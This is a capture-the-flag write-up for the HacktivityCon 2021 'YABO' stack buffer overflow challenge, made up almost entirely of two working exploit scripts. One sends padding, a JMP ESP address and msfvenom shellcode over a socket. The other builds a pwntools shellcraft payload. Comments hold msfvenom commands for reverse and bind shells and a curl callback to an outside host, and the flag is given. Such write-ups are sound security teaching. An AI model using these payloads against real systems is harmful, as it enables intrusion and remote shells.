---
name: YABO - Yet Another Buffer Overflow (2021)
event: HacktivityCon CTF 2021
category: Pwn
description: Writeup for YABO - Yet Another Buffer Overflow (pwn) - HacktivityCon CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# YABO - Yet Another Buffer Overflow

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/niPj8jYahV0/0.jpg)](https://youtu.be/niPj8jYahV0?t=3195s "HacktivityCon 2021: YABO - Yet Another Buffer Overflow")

## Challenge Description

> Some certifications feature a basic windows buffer overflow. Is the linux version really that different?

## Solution

#### msfvenom_payload.py

{% code overflow="wrap" %}
```py
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 9999))

print(client.recv(1024))

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\x00' -f python
# msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
# msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
# msfvenom -p linux/x86/read_file PATH=flag.txt FD=4 -b '\x00' -f python

# FD = 4
buf = b"A" * 1044
buf += b"\xe2\x92\x04\x08"  # ropper found JMP ESP
buf += b"\x90" * 10
buf += b"\xd9\xec\xd9\x74\x24\xf4\x5a\x31\xc9\xbe\x8b\x25\xd9"
buf += b"\x0b\xb1\x12\x83\xc2\x04\x31\x72\x15\x03\x72\x15\x69"
buf += b"\xd0\x32\x3d\xd5\x1e\xc5\x42\x25\x7a\xf4\x8b\xe8\xfc"
buf += b"\x7f\xc8\x4a\xff\x7f\xcf\xaa\x89\x67\x46\x53\x33\x67"
buf += b"\x49\xa3\x44\xa5\xe9\x2a\x86\x8d\xee\x2c\x07\xee\x55"
buf += b"\x28\x07\xee\xa9\xfd\x87\x56\xa8\xfd\x87\xa6\x10\xfd"
buf += b"\x87\xa6\x66\x30\x07\x4e\xa3\x35\xf7\x70\x4a\xa5\x69"
buf += b"\xe8\xbd\x41\x12\x82\xc1"

client.send(buf)
print(client.recv(1024))
client.close()
```
{% endcode %}

#### pwntools_exploit.py

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './yabo'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 1044

jmp_esp = 0x80492e2

# Start program
io = start()

# Build the payload
payload = flat([
    asm('nop') * offset,
    jmp_esp,
    asm(shellcraft.cat('flag.txt', fd=4))
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(':', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{2f20f16416a066ca5d4247a438403f21}`
